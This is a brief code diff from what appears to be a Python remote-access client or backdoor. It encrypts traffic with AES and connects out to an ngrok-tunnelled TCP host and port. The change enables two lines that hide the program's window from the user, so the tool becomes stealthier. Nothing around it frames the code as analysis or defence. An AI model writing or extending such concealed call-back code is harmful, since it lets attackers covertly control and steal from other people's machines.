@@ -11,8 +11,8 @@ cipher = AES.new(super_secret_key, AES.MODE_ECB)
 HOST = '0.tcp.eu.ngrok.io' # Your tcp host
 PORT = 1234 # Your tcp open port
 
-'''hwnd = win32gui.GetForegroundWindow()
-win32gui.ShowWindow(hwnd, win32con.SW_HIDE)'''
+hwnd = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
 
 c = remote(HOST, PORT)
 
